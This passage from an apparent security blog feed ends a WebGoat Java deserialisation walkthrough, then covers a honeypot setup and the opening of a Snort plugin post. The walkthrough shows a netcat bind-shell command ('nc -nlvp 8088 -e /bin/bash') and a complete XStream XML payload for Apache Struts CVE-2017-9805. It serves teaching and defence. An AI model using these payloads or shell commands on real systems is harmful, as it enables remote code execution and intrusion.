            ("bind shell", "nc -nlvp 8088 -e /bin/bash");
        try
        {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(go);
            oos.flush();
            oos.close();
            System.out.println(Base64.getEncoder()
                .encodeToString(bos.toByteArray()));
        }
        catch (IOException ioe)
        {
            System.out.println(ioe.getLocalizedMessage());
        }
    }
}</pre>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="./../../../wp-content/uploads/2021/08/token-1.png"><img loading="lazy" decoding="async" width="945" height="107" src="./../../../wp-content/uploads/2021/08/token-1.png" alt="" class="wp-image-412" srcset="./../../../wp-content/uploads/2021/08/token-1.png 945w, ./../../../wp-content/uploads/2021/08/token-1-300x34.png 300w, ./../../../wp-content/uploads/2021/08/token-1-768x87.png 768w, ./../../../wp-content/uploads/2021/08/token-1-210x24.png 210w" sizes="(max-width: 945px) 100vw, 945px" /></a><figcaption><em>Generating the serialised data</em></figcaption></figure></div>



<p>We can then inject this serialised data into the captured HTTP request as a POST body parameter within the interception proxy, and transmit it to the endpoint, where the application will deserialise and execute it. Note that the package must match the package of the class as it is used in the target application. <em>Note:</em> <em>We also need to embed the current system time into the object &#8211; this is a requirement peculiar to WebGoat (introduced presumably to thwart attempts to solve the associated training exercise using pre-canned solutions)</em> :<span class="has-inline-color has-black-color">.</span></p>



<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="./../../../wp-content/uploads/2021/08/burp-mod.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/08/burp-mod-1024x808.png" alt="" class="wp-image-406" width="720" height="568" srcset="./../../../wp-content/uploads/2021/08/burp-mod-1024x808.png 1024w, ./../../../wp-content/uploads/2021/08/burp-mod-300x237.png 300w, ./../../../wp-content/uploads/2021/08/burp-mod-768x606.png 768w, ./../../../wp-content/uploads/2021/08/burp-mod-210x166.png 210w, ./../../../wp-content/uploads/2021/08/burp-mod.png 1044w" sizes="(max-width: 720px) 100vw, 720px" /></a><figcaption><em>Captured request modified to include serialised payload</em></figcaption></figure></div>



<p>If we now start a Netcat instance on our attacking host, using the IP address of the target host and the port on which the payload is listening, we should be able to establish a bind shell which will accept commands, execute them and return the subsequent output:</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><a href="./../../../wp-content/uploads/2021/08/bindshell.png"><img loading="lazy" decoding="async" width="799" height="639" src="./../../../wp-content/uploads/2021/08/bindshell.png" alt="" class="wp-image-407" srcset="./../../../wp-content/uploads/2021/08/bindshell.png 799w, ./../../../wp-content/uploads/2021/08/bindshell-300x240.png 300w, ./../../../wp-content/uploads/2021/08/bindshell-768x614.png 768w, ./../../../wp-content/uploads/2021/08/bindshell-210x168.png 210w" sizes="(max-width: 799px) 100vw, 799px" /></a><figcaption><em>Using the bind shell on the target to execute system commands</em></figcaption></figure></div>



<p>We have a low-privilege shell executing in the context of the WebGoat user, which only allows limited interaction with the target host. The next step would be to attempt privilege escalation to upgrade the shell to one with system privileges, which is beyond the scope of this post.</p>



<p>It does demonstrate however that a simple vulnerability can give an initial foothold from which a more sophisticated attack could be launched. Compromising this host may not provide direct access  to sensitive or valuable data itself, but it could form part of a multi-stage attack, for example by being used to host an SSH tunnel between internal network segments to aid exploit upload and/or data exfiltration, as a platform for creating new system user accounts, or for launching credential harvesting phishing attacks against other internal users. </p>



<p>If this this vulnerability was present in a production system, and threat modelling indicated that (a) the likelihood of exploitation was high, and (b) a high value information asset would be negatively impacted, this would expose the organisation to a very high level of risk, and as such it would be given a high priority for mitigation.</p>


<h2 class="wp-block-heading" id="deserialisation-vulnerabilities-in-the-wild">Deserialisation Vulnerabilities In The Wild</h2>


<p>The scenario described above is obviously a highly contrived, simplified example constructed to help illustrate a concept.</p>



<p>Real-world deserialisation vulnerabilities are usually much more complicated to exploit, typically involving a cascading sequence of unsafe deserialisation operations involving many classes (also known as a &#8220;Gadget Chain&#8221;) which ultimately leads to the actual compromise.</p>



<p>However, deserialisation vulnerabilities of this nature do occur in the wild &#8211; one such example is <a href="https://nvd.nist.gov/vuln/detail/cve-2017-9805"><span class="has-inline-color has-luminous-vivid-amber-color">CVE-2017-9805</span></a>, a flaw within the <a href="http://struts.apache.org/plugins/rest/"><span class="has-inline-color has-luminous-vivid-amber-color">REST Plugin</span></a> in the <a href="http://struts.apache.org/index.html"><span class="has-inline-color has-luminous-vivid-amber-color">Apache Struts</span></a> MVC Java framework which remained undiscovered for nine years until it was found by security researcher <a target="_blank" href="https://github.com/m-y-mo" rel="noreferrer noopener"><span class="has-inline-color has-luminous-vivid-amber-color">Man Yue Mo</span></a> in July 2017 and which was initially blamed in part for the <a href="https://www.equifax.co.uk/about-equifax/press-releases/en_gb/-/blog/equifax-ltd-uk-update-regarding-the-ongoing-investigation-into-us-cyber-security-incident"><span class="has-inline-color has-luminous-vivid-amber-color">Equifax data breach</span></a> in September 2017.</p>


<h3 class="wp-block-heading" id="cve20179805">CVE-2017-9805</h3>


<div class="wp-block-image"><figure class="aligncenter size-medium_large"><a href="./../../../wp-content/uploads/2021/08/nist-cve-2017-9805.png"><img loading="lazy" decoding="async" width="768" height="392" src="./../../../wp-content/uploads/2021/08/nist-cve-2017-9805-768x392.png" alt="NIST CVE-2017-9805" class="wp-image-392" srcset="./../../../wp-content/uploads/2021/08/nist-cve-2017-9805-768x392.png 768w, ./../../../wp-content/uploads/2021/08/nist-cve-2017-9805-300x153.png 300w, ./../../../wp-content/uploads/2021/08/nist-cve-2017-9805-1024x523.png 1024w, ./../../../wp-content/uploads/2021/08/nist-cve-2017-9805-210x107.png 210w, ./../../../wp-content/uploads/2021/08/nist-cve-2017-9805.png 1263w" sizes="(max-width: 768px) 100vw, 768px" /></a><figcaption><a href="https://nvd.nist.gov/vuln/detail/cve-2017-9805" target="_blank" rel="noreferrer noopener">https://nvd.nist.gov/vuln/detail/cve-2017-9805</a></figcaption></figure></div>



<p>The vulnerable class within the plugin deserialises data passed into it in XML format without performing any sanitisation of its contents. The result is that a suitably crafted payload can be used to cause remote code execution on the host machine, in a similar way to that demonstrated above on the WebGoat application, the difference here being that the payload needs to be structured as XML data before serialisation.</p>



<p>Exploiting the vulnerability involves sending an HTTP POST request to the target host, with the request body data formatted as shown in the snippet below, with the [command] placeholder on line 17 edited to contain the system command to be executed on deserialisation:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="xml" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="true" data-enlighter-lineoffset="214" data-enlighter-title="" data-enlighter-group="">&lt;map>
&lt;entry>
&lt;jdk.nashorn.internal.objects.NativeString>
&lt;flags>0&lt;/flags>
&lt;value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
&lt;dataHandler>
&lt;dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
&lt;is class="javax.crypto.CipherInputStream">
&lt;cipher class="javax.crypto.NullCipher">
&lt;initialized>false&lt;/initialized>
&lt;opmode>0&lt;/opmode>
&lt;serviceIterator class="javax.imageio.spi.FilterIterator">
&lt;iter class="javax.imageio.spi.FilterIterator">
&lt;iter class="java.util.Collections$EmptyIterator"/>
&lt;next class="java.lang.ProcessBuilder">
&lt;command>
&lt;string>/bin/sh&lt;/string>&lt;string>-c&lt;/string>&lt;string> [command] &lt;/string>
&lt;/command>
&lt;redirectErrorStream>false&lt;/redirectErrorStream>
&lt;/next>
&lt;/iter>
&lt;filter class="javax.imageio.ImageIO$ContainsFilter">
&lt;method>
&lt;class>java.lang.ProcessBuilder&lt;/class>
&lt;name>start&lt;/name>
&lt;parameter-types/>
&lt;/method>
&lt;name>foo&lt;/name>
&lt;/filter>
&lt;next class="string">foo&lt;/next>
&lt;/serviceIterator>
&lt;lock/>
&lt;/cipher>
&lt;input class="java.lang.ProcessBuilder$NullInputStream"/>
&lt;ibuffer/>
&lt;done>false&lt;/done>
&lt;ostart>0&lt;/ostart>
&lt;ofinish>0&lt;/ofinish>
&lt;closed>false&lt;/closed>
&lt;/is>
&lt;consumed>false&lt;/consumed>
&lt;/dataSource>
&lt;transferFlavors/>
&lt;/dataHandler>
&lt;dataLen>0&lt;/dataLen>
&lt;/value>
&lt;/jdk.nashorn.internal.objects.NativeString>
&lt;jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
&lt;/entry>
&lt;entry>
&lt;jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
&lt;jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
&lt;/entry>
&lt;/map>


</pre>



<p>A pre/post fix analysis of the vulnerable Struts REST plugin class <em><a href="https://struts.apache.org/maven/struts2-plugins/struts2-rest-plugin/apidocs/org/apache/struts2/rest/handler/XStreamHandler.html"><span class="has-inline-color has-luminous-vivid-amber-color">XStreamHandler</span></a> </em>(performed by <a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/apache-struts-at-rest-analyzing-remote-code-execution-vulnerability-cve-2017-9805/"><span class="has-inline-color has-luminous-vivid-amber-color">Hardik Shah of McAfee Labs</span></a>) shows that pre-fix, the methods responsible for serialising to and from XML and Java objects: <span class="has-inline-color has-white-color"><em>fromObject</em> </span>and <em><span class="has-inline-color has-white-color">toObject</span>,</em> did so by creating instances of the <em><a href="https://x-stream.github.io/"><span class="has-inline-color has-luminous-vivid-amber-color">XStream</span></a> </em>XML parser class with default invocation permissions. This meant that there was no filtering being performed on the contents of the data being deserialised. Post-fix, the methods now expect an extra<em> </em>parameter of type <em><a href="https://struts.apache.org/maven/struts2-core/apidocs/com/opensymphony/xwork2/ActionInvocation.html"><span class="has-inline-color has-luminous-vivid-amber-color"><em>Action</em>Invocation</span></a></em>. This is used to set the permissions on the <em><span class="has-inline-color has-white-color">XStream</span> </em>XML parser &#8211; effectively applying a whitelist filter to the deserialised data content before it is used to construct a Java object:</p>



<figure class="wp-block-image size-large"><a href="./../../../wp-content/uploads/2021/09/mcafee_001.png"><img loading="lazy" decoding="async" width="1024" height="434" src="./../../../wp-content/uploads/2021/09/mcafee_001-1024x434.png" alt="" class="wp-image-455" srcset="./../../../wp-content/uploads/2021/09/mcafee_001-1024x434.png 1024w, ./../../../wp-content/uploads/2021/09/mcafee_001-300x127.png 300w, ./../../../wp-content/uploads/2021/09/mcafee_001-768x326.png 768w, ./../../../wp-content/uploads/2021/09/mcafee_001-210x89.png 210w, ./../../../wp-content/uploads/2021/09/mcafee_001.png 1106w" sizes="(max-width: 980px) 100vw, 980px" /></a></figure>


<h2 class="wp-block-heading" id="summary">Summary</h2>


<p>I think the following <a href="https://blogs.apache.org/foundation/entry/apache-struts-statement-on-equifax"><span class="has-inline-color has-luminous-vivid-amber-color">quote from the Apache Struts development team</span></a> in response to CVE-2017-9805 epitomises the view outlined at the beginning of this post &#8211; that in the drive to deliver functionality, it is all too easy to introduce vulnerabilities unwittingly, unless security requirements are given the same level of importance as functional and other non-functional requirements from the outset:</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"><p>Regarding the assertion that especially CVE-2017-9805 is a nine year old security flaw, one has to understand that there is a huge difference between detecting a flaw after nine years and knowing about a flaw for several years. If the latter was the case, the team would have had a hard time to provide a good answer why they did not fix this earlier. But this was actually not the case here &#8211; we were notified just recently on how a certain piece of code can be misused, and we fixed this ASAP. What we saw here is common software engineering business &#8211; <span class="has-inline-color has-vivid-red-color">people write code for achieving a desired function, but may not be aware of undesired side-effects</span>. Once this awareness is reached, we as well as hopefully all other library and framework maintainers put high efforts into removing the side-effects as soon as possible.</p><cite><a href="https://blogs.apache.org/foundation/entry/apache-struts-statement-on-equifax" target="_blank" rel="noreferrer noopener">https://blogs.apache.org/foundation/entry/apache-struts-statement-on-equifax</a></cite></blockquote>



<p></p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Cloud Hosted Honeypots: Harvesting Attack Packet Captures</title>
		<link>./../../../cloud-hosted-honeypots-harvesting-attack-packet-captures/index.html</link>
		
		<dc:creator><![CDATA[spen440]]></dc:creator>
		<pubDate>Wed, 23 Aug 2017 14:59:37 +0000</pubDate>
				<category><![CDATA[Honeypot]]></category>
		<category><![CDATA[Threat Intelligence]]></category>
		<category><![CDATA[MHN]]></category>
		<category><![CDATA[Packet Capture]]></category>
		<category><![CDATA[Wireshark]]></category>
		<guid isPermaLink="false">./../../../index.html?p=321</guid>

					<description><![CDATA[&#160; Introduction Packet and protocol analysis are skills which fall squarely into the &#8220;use it or lose it&#8221; category, and can easily atrophy through lack of practice. As Stephen Northcutt &#8211; President of the SANS Technology Institute &#8211; says in the foreword to Brian Caswell, Jay Beale and Andrew Baker&#8217;s book Snort Intrusion Detection and Prevention [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>&nbsp;</p>
<h2>Introduction</h2>
<p>Packet and protocol analysis are skills which fall squarely into the &#8220;use it or lose it&#8221; category, and can easily atrophy through lack of practice. As Stephen Northcutt &#8211; President of the SANS Technology Institute &#8211; says in the foreword to Brian Caswell, Jay Beale and Andrew Baker&#8217;s book <a href="https://www.elsevier.com/books/snort-intrusion-detection-and-prevention-toolkit/caswell/978-1-59749-099-3?start_rank=1&amp;sortby=sortByRelevance&amp;imprintname=Syngress&amp;q=snort">Snort Intrusion Detection and Prevention Toolkit</a>: &#8220;<em>&#8230;understanding the network traffic entering, leaving and within your network</em>&#8230;&#8221; is one of the &#8220;&#8230;<em>basic skills a professional must have to avoid being impotent as a security practitioner</em>&#8220;.</p>
<p>There are plenty of publicly available sources of sample packet captures on the internet, but <span id="more-321"></span>personally I&#8217;d prefer to capture my own. Having detailed knowledge of (and control over) the environment in which the capture was generated not only allows for much more comprehensive analysis of the traffic itself to be performed, but also allows for inspection of the state of the local devices involved in the network conversations, which can give more insight into the outcome of the communcation events, and possibly the intentions of the actors responsible for initiating the exchange.</p>
<h2>Modern Honey Network</h2>
<p>Setting up a honeypot seemed to be a good way of going about attracting the attention of malicious actors and recording any interactions which take place, so I decided to pursue this as a coure of action. I&#8217;d recently read an article about <a href="https://www.anomali.com/platform/modern-honey-net">Modern Honey Network</a> and it sounded like this might be an ideal means of acheiving my objective. MHN is a framework for deploying and monitoring a network of distributed, low-interaction honeypots. It&#8217;s an open source project developed by the engineers responsible for the <a href="https://www.anomali.com/platform/threatstream">ThreatStream</a> Threat Intelligence Platform. It supports the <a href="https://github.com/rep/hpfeeds">HPFeeds</a> authenticated publish-subscribe protocol, to allow it to receive threat event data from deployed honeypots.</p>
<p>MHN supports a large number of honeypot implementations, including <a href="https://github.com/DinoTools/dionaea">Dionaea</a> which I decided to try out first as a means of testing the deployment process.</p>
<p><strong>Note:</strong> The primary purpose of the framework described here is the collection of malware samples for analysis;  I plan to document the results of experimenting with these capabilities in a later post.</p>
<h2>Infrastructure</h2>
<p>To avoid the security issues associated with hosting a honeypot on my own DMZ and exposing it to the outside world, I decided to make use of Amazon&#8217;s <a href="https://aws.amazon.com/free/">AWS EC2 free tier</a> and set up separate <a href="https://aws.amazon.com/ec2/instance-types/t2/">t2 micro</a> instances for MHN and the Dionaea honeypot sensor node:</p>
<p><figure id="attachment_323" aria-describedby="caption-attachment-323" style="width: 980px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/08/4D5AF066-AAA3-43E1-904B-5CC1BF9C77FE.jpg"><img loading="lazy" decoding="async" class="wp-image-323 size-large" src="./../../../wp-content/uploads/2017/08/4D5AF066-AAA3-43E1-904B-5CC1BF9C77FE-1024x327.jpg" alt="" width="980" height="313" data-wp-pid="323" srcset="./../../../wp-content/uploads/2017/08/4D5AF066-AAA3-43E1-904B-5CC1BF9C77FE-1024x327.jpg 1024w, ./../../../wp-content/uploads/2017/08/4D5AF066-AAA3-43E1-904B-5CC1BF9C77FE-300x96.jpg 300w, ./../../../wp-content/uploads/2017/08/4D5AF066-AAA3-43E1-904B-5CC1BF9C77FE-768x245.jpg 768w, ./../../../wp-content/uploads/2017/08/4D5AF066-AAA3-43E1-904B-5CC1BF9C77FE-1536x490.jpg 1536w, ./../../../wp-content/uploads/2017/08/4D5AF066-AAA3-43E1-904B-5CC1BF9C77FE-210x67.jpg 210w, ./../../../wp-content/uploads/2017/08/4D5AF066-AAA3-43E1-904B-5CC1BF9C77FE.jpg 1840w" sizes="(max-width: 980px) 100vw, 980px" /></a><figcaption id="caption-attachment-323" class="wp-caption-text">AWS EC2 t2 micro instances for the honeynet management and honeypot hosts.</figcaption></figure></p>
<h2>MHN Instance</h2>
<p>After setting up the MHN instance, I perfomed some rudimentary hardening &#8211; setting up an access control list within the AWS launch configuration to only permit traffic between my home machine and the MHN instance, and between the MHN instance and the honeypot instance, and also disabled all unneeded services. <strong>Note:</strong> <em>AWS EC2 instances by default release their public IP addresses when stopped. It&#8217;s worth allocating an Elastic IP address to the instance, to avoid having to reconfigure MHN and the underlying Nginx web server every time the instance is restarted.</em></p>
<p>Installing MHN involves spinning up the relevant EC2 instance, SSH&#8217;ing in and running through the installation steps detailed on the <a href="https://github.com/threatstream/mhn#installing-server-tested-ubuntu-12043-x86_64">MHN GitHub wiki page</a>. After the installation completes, the supervisorctl service can be queried to determine the state of the child services:</p>
<p><figure id="attachment_326" aria-describedby="caption-attachment-326" style="width: 661px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/08/538AAC4A-7B3D-4CC7-8644-13A4C71962C8.jpg"><img loading="lazy" decoding="async" class="wp-image-326" src="./../../../wp-content/uploads/2017/08/538AAC4A-7B3D-4CC7-8644-13A4C71962C8.jpg" alt="" width="661" height="263" data-wp-pid="326" srcset="./../../../wp-content/uploads/2017/08/538AAC4A-7B3D-4CC7-8644-13A4C71962C8.jpg 603w, ./../../../wp-content/uploads/2017/08/538AAC4A-7B3D-4CC7-8644-13A4C71962C8-300x119.jpg 300w, ./../../../wp-content/uploads/2017/08/538AAC4A-7B3D-4CC7-8644-13A4C71962C8-210x84.jpg 210w" sizes="(max-width: 661px) 100vw, 661px" /></a><figcaption id="caption-attachment-326" class="wp-caption-text">MHN service status</figcaption></figure></p>
<p>Opening a web browser at the IP address of the MHN instance should cause the MHN web server landing page to be displayed, confirming a successful installation.</p>
<h2>Honeypot Instance</h2>
<p>The access control list of the AWS launch configuration associated with the honeypot instance needs to be updated allow attackers to interact with the fake vulnerable services presented by Dionaea. The services and protocols we&#8217;re particularly intested in here are: FTP, SMB, MSSQL and SIP, but we also need to allow access via SSH so we can communicate directly with the host for management purposes.</p>
<p>The next step is to launch the honeypot AWS EC2 instance and SSH into it. The honeypot deployment script can be accessed via the &#8220;Deploy&#8221; tab on the MHN web interface:</p>
<p><a href="./../../../wp-content/uploads/2017/08/08BE5F7B-31A1-4E06-BD90-EE7E838E2BF9.jpg"><img loading="lazy" decoding="async" class="alignnone size-large wp-image-342" src="./../../../wp-content/uploads/2017/08/08BE5F7B-31A1-4E06-BD90-EE7E838E2BF9-1024x616.jpg" alt="" width="980" height="590" data-wp-pid="342" srcset="./../../../wp-content/uploads/2017/08/08BE5F7B-31A1-4E06-BD90-EE7E838E2BF9-1024x616.jpg 1024w, ./../../../wp-content/uploads/2017/08/08BE5F7B-31A1-4E06-BD90-EE7E838E2BF9-300x180.jpg 300w, ./../../../wp-content/uploads/2017/08/08BE5F7B-31A1-4E06-BD90-EE7E838E2BF9-768x462.jpg 768w, ./../../../wp-content/uploads/2017/08/08BE5F7B-31A1-4E06-BD90-EE7E838E2BF9-1536x923.jpg 1536w, ./../../../wp-content/uploads/2017/08/08BE5F7B-31A1-4E06-BD90-EE7E838E2BF9-210x126.jpg 210w, ./../../../wp-content/uploads/2017/08/08BE5F7B-31A1-4E06-BD90-EE7E838E2BF9.jpg 1592w" sizes="(max-width: 980px) 100vw, 980px" /></a></p>
<p>The script can be copied to the terminal connected to the honeypot instance and executed, causing the installation process to begin. Once complete, the supervisorctl service can be queried to determine the state of the child services:</p>
<p><figure id="attachment_343" aria-describedby="caption-attachment-343" style="width: 658px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/08/75F4B144-3FAC-4666-94DF-59B8662F7BF5.jpg"><img loading="lazy" decoding="async" class="wp-image-343" src="./../../../wp-content/uploads/2017/08/75F4B144-3FAC-4666-94DF-59B8662F7BF5.jpg" alt="" width="658" height="142" data-wp-pid="343" srcset="./../../../wp-content/uploads/2017/08/75F4B144-3FAC-4666-94DF-59B8662F7BF5.jpg 598w, ./../../../wp-content/uploads/2017/08/75F4B144-3FAC-4666-94DF-59B8662F7BF5-300x65.jpg 300w, ./../../../wp-content/uploads/2017/08/75F4B144-3FAC-4666-94DF-59B8662F7BF5-210x45.jpg 210w" sizes="(max-width: 658px) 100vw, 658px" /></a><figcaption id="caption-attachment-343" class="wp-caption-text">Dionaea honeypot service running</figcaption></figure></p>
<p>A OS and version Nmap scan directed at the IP address of the honeypot confirms that the ports for services we&#8217;re exposing are open (note also those marked as &#8216;closed&#8217; by nmap &#8211; these are ports open on the firewall but with no service behind them; this will be addressed at a later date when the relevant web, mail, directory and file services are enabled using installations of other honeypots on the same host).</p>
<p><figure id="attachment_325" aria-describedby="caption-attachment-325" style="width: 980px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/08/245FCA82-1000-4F25-B2BA-745CE2E5F874.jpg"><img loading="lazy" decoding="async" class="wp-image-325 size-large" src="./../../../wp-content/uploads/2017/08/245FCA82-1000-4F25-B2BA-745CE2E5F874-1024x796.jpg" alt="" width="980" height="762" data-wp-pid="325" srcset="./../../../wp-content/uploads/2017/08/245FCA82-1000-4F25-B2BA-745CE2E5F874-1024x796.jpg 1024w, ./../../../wp-content/uploads/2017/08/245FCA82-1000-4F25-B2BA-745CE2E5F874-300x233.jpg 300w, ./../../../wp-content/uploads/2017/08/245FCA82-1000-4F25-B2BA-745CE2E5F874-768x597.jpg 768w, ./../../../wp-content/uploads/2017/08/245FCA82-1000-4F25-B2BA-745CE2E5F874-210x163.jpg 210w, ./../../../wp-content/uploads/2017/08/245FCA82-1000-4F25-B2BA-745CE2E5F874.jpg 1294w" sizes="(max-width: 980px) 100vw, 980px" /></a><figcaption id="caption-attachment-325" class="wp-caption-text">Nmap scan of the honeypot host</figcaption></figure></p>
<p>With the honeypot up and running, it&#8217;s not long before attacks are being detected and communicated back the MHN management interface:</p>
<p><a href="./../../../wp-content/uploads/2017/08/F0D0D9C9-0741-4979-A6B6-F692B1E8EE33.jpg"><img loading="lazy" decoding="async" class="size-large wp-image-328 aligncenter" src="./../../../wp-content/uploads/2017/08/F0D0D9C9-0741-4979-A6B6-F692B1E8EE33-1024x554.jpg" alt="" width="980" height="530" data-wp-pid="328" srcset="./../../../wp-content/uploads/2017/08/F0D0D9C9-0741-4979-A6B6-F692B1E8EE33-1024x554.jpg 1024w, ./../../../wp-content/uploads/2017/08/F0D0D9C9-0741-4979-A6B6-F692B1E8EE33-300x162.jpg 300w, ./../../../wp-content/uploads/2017/08/F0D0D9C9-0741-4979-A6B6-F692B1E8EE33-768x416.jpg 768w, ./../../../wp-content/uploads/2017/08/F0D0D9C9-0741-4979-A6B6-F692B1E8EE33-1536x831.jpg 1536w, ./../../../wp-content/uploads/2017/08/F0D0D9C9-0741-4979-A6B6-F692B1E8EE33-210x114.jpg 210w, ./../../../wp-content/uploads/2017/08/F0D0D9C9-0741-4979-A6B6-F692B1E8EE33.jpg 1741w" sizes="(max-width: 980px) 100vw, 980px" /></a></p>
<p><a href="./../../../wp-content/uploads/2017/08/F7307E38-36C1-467A-B674-612203DDDBE5.jpg"><img loading="lazy" decoding="async" class="size-large wp-image-329 aligncenter" src="./../../../wp-content/uploads/2017/08/F7307E38-36C1-467A-B674-612203DDDBE5-1024x509.jpg" alt="" width="980" height="487" data-wp-pid="329" srcset="./../../../wp-content/uploads/2017/08/F7307E38-36C1-467A-B674-612203DDDBE5-1024x509.jpg 1024w, ./../../../wp-content/uploads/2017/08/F7307E38-36C1-467A-B674-612203DDDBE5-300x149.jpg 300w, ./../../../wp-content/uploads/2017/08/F7307E38-36C1-467A-B674-612203DDDBE5-768x381.jpg 768w, ./../../../wp-content/uploads/2017/08/F7307E38-36C1-467A-B674-612203DDDBE5-1536x763.jpg 1536w, ./../../../wp-content/uploads/2017/08/F7307E38-36C1-467A-B674-612203DDDBE5-210x104.jpg 210w, ./../../../wp-content/uploads/2017/08/F7307E38-36C1-467A-B674-612203DDDBE5.jpg 1907w" sizes="(max-width: 980px) 100vw, 980px" /></a></p>
<p><a href="./../../../wp-content/uploads/2017/08/honeymap-capture-001.png"><img loading="lazy" decoding="async" class="size-large wp-image-330 aligncenter" src="./../../../wp-content/uploads/2017/08/honeymap-capture-001-1024x515.png" alt="" width="980" height="493" data-wp-pid="330" srcset="./../../../wp-content/uploads/2017/08/honeymap-capture-001-1024x515.png 1024w, ./../../../wp-content/uploads/2017/08/honeymap-capture-001-300x151.png 300w, ./../../../wp-content/uploads/2017/08/honeymap-capture-001-768x386.png 768w, ./../../../wp-content/uploads/2017/08/honeymap-capture-001-1536x772.png 1536w, ./../../../wp-content/uploads/2017/08/honeymap-capture-001-210x106.png 210w, ./../../../wp-content/uploads/2017/08/honeymap-capture-001.png 1906w" sizes="(max-width: 980px) 100vw, 980px" /></a></p>
<h2>Packet Capture and Anlaysis</h2>
<p>Since</p>
<p>Since my initial objective was to capture network traffic at the honeypot whist it was under attack, I installed TShark (the command line version of the protocol analyser Wireshark) and began capturing packets:</p>
<p><figure id="attachment_324" aria-describedby="caption-attachment-324" style="width: 661px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/08/7F6C27DF-E565-4501-A10D-10C14B0DC05B.jpg"><img loading="lazy" decoding="async" class="wp-image-324" src="./../../../wp-content/uploads/2017/08/7F6C27DF-E565-4501-A10D-10C14B0DC05B.jpg" alt="" width="661" height="195" data-wp-pid="324" srcset="./../../../wp-content/uploads/2017/08/7F6C27DF-E565-4501-A10D-10C14B0DC05B.jpg 539w, ./../../../wp-content/uploads/2017/08/7F6C27DF-E565-4501-A10D-10C14B0DC05B-300x88.jpg 300w, ./../../../wp-content/uploads/2017/08/7F6C27DF-E565-4501-A10D-10C14B0DC05B-210x62.jpg 210w" sizes="(max-width: 661px) 100vw, 661px" /></a><figcaption id="caption-attachment-324" class="wp-caption-text">Capturing packet at the honeypot using TShark</figcaption></figure></p>
<p>After allowing TShark to run for about 15 minutes, I used SCP to copy the resultant pcap file back to my home machine for analysis in Wireshark. By comparing the threat event data presented on the MHN management interface with the traffic recorded within the pcap file, it was possible to identify what at first glance appear to be fairly typical attacks directed at specific services. For example, the screenshot below shows what appears to be a VoIP Caller ID spoof attack, where the &#8220;From&#8221; value embedded within the packet header has been falsified within a SIP protocol &#8220;INVITE&#8221; request:</p>
<p><a href="./../../../wp-content/uploads/2017/08/B47C1E42-05E7-4286-9671-8852812E3583.png"><img loading="lazy" decoding="async" class="size-large wp-image-327 aligncenter" src="./../../../wp-content/uploads/2017/08/B47C1E42-05E7-4286-9671-8852812E3583.png" alt="" width="974" height="879" data-wp-pid="327" srcset="./../../../wp-content/uploads/2017/08/B47C1E42-05E7-4286-9671-8852812E3583.png 974w, ./../../../wp-content/uploads/2017/08/B47C1E42-05E7-4286-9671-8852812E3583-300x271.png 300w, ./../../../wp-content/uploads/2017/08/B47C1E42-05E7-4286-9671-8852812E3583-768x693.png 768w, ./../../../wp-content/uploads/2017/08/B47C1E42-05E7-4286-9671-8852812E3583-210x190.png 210w" sizes="(max-width: 974px) 100vw, 974px" /></a>Pcap file captured from honeypot analysed in Wireshark</p>
<h2>Conclusion</h2>
<p>The Modern Honey Network project greatly simplifies the process of setting up and monitoring a network of low-interaction honeypots. This post described the outcome of my initial experiments using the platform as a means of capturing &#8216;real life&#8217; packet data for analysis. The next steps will involve improving the configuration of the exposed fake services to present a more attractive target to attackers, in the hope that threat activity of a more advanced, persistent nature might be captured. I also plan to expand the network detailed in this post with additional honeypots, and to make use of the framework&#8217;s in-built facilties for capturing samples of malware for analysis.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Snort IDS Custom Dynamic Preprocessor, Part 1</title>
		<link>./../../../snort-custom-dynamic-preprocessor/index.html</link>
		
		<dc:creator><![CDATA[spen440]]></dc:creator>
		<pubDate>Tue, 08 Aug 2017 10:49:43 +0000</pubDate>
				<category><![CDATA[IDS]]></category>
		<category><![CDATA[Network Reconnaissance]]></category>
		<category><![CDATA[SIEM]]></category>
		<category><![CDATA[Network]]></category>
		<category><![CDATA[Plugin]]></category>
		<category><![CDATA[Snort]]></category>
		<category><![CDATA[Splunk]]></category>
		<guid isPermaLink="false">./../../../index.html?p=245</guid>

					<description><![CDATA[&#160; Introduction This post describes process of building a custom dynamic preprocessor plugin for the Snort Network Intrusion Detection / Prevention System (IDS / IPS). Snort is rules-based IDS. Although Snort rules have a simple structure, the number and variety of options within the Snort rule syntax allows reasonably complex analysis of packets under inspection [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>&nbsp;</p>
<h2>Introduction</h2>
<p>This post describes process of building a custom dynamic preprocessor plugin for the Snort Network Intrusion Detection / Prevention System (IDS / IPS).</p>
<p>Snort is rules-based IDS. Although Snort rules have a simple structure, the number and variety of options within the Snort rule syntax allows reasonably complex analysis of packets under inspection to be performed. This is fine for situations where the symptoms of the threat being defended against can be <span id="more-245"></span></p>
<p>encapsulated within single logical expression (for example: &#8220;if the packet under inspection uses the TCP protocol, comes from the external network, is directed towards a database server within the internal network, and has the characters &#8220;0x02&#8243; at an offset of 23 bytes within its payload, then drop the packet&#8221;). However, if more complex analysis is needed then a different approach is required.</p>
<h2>Preprocessors</h2>
